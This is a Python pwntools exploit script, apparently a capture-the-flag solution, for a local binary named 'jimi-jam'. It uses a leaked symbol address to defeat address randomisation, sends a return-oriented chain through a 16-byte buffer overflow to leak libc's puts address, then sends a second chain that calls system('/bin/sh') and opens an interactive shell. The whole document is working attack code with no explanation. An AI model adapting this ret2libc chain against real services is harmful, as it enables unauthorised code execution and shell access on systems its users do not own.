from pwn import *
from IPython import embed

context.arch = "amd64"
context.terminal = ["terminator","-e"]

p = process("./jimi-jam")


l = ELF("./jimi-jam")

r = l.symbols['ROPJAIL']
p.recvuntil("here! ")

ropjail_leak = p.recvuntil('\n')[2:-1]

print(ropjail_leak)

ropjail_leak = int(ropjail_leak, 16)

binary_start = ropjail_leak - r

l.address =  binary_start
pop_rdi = 0x00000000000013a3 + binary_start

print(f"binary start: {hex(binary_start)}")

puts_addr = 0x10b0 + binary_start
# puts_addr = l.symbols['puts']
puts_libc_addr = l.got['puts']

vuln = l.symbols['vuln']

payload = flat([
    pop_rdi,
    puts_libc_addr,
    puts_addr,
    vuln
    ])

p.clean(1)
p.send(b'A'*16 + payload)


libc_puts = p.recvuntil('\n')[:-1]
print(libc_puts)

libc_puts = u64(libc_puts.ljust(8,b'\x00'))

libc = ELF("/lib/libc.so.6")
libc_puts_offset = libc.symbols['puts']

libc_start = libc_puts - libc_puts_offset
libc.address = libc_start

binsh = next(libc.search(b"/bin/sh"))
print(hex(binsh))
sys = libc.sym.system

payload = flat([
    pop_rdi,
    binsh,
    sys
    ])

p.send(b'A'*16 + payload)
p.interactive()
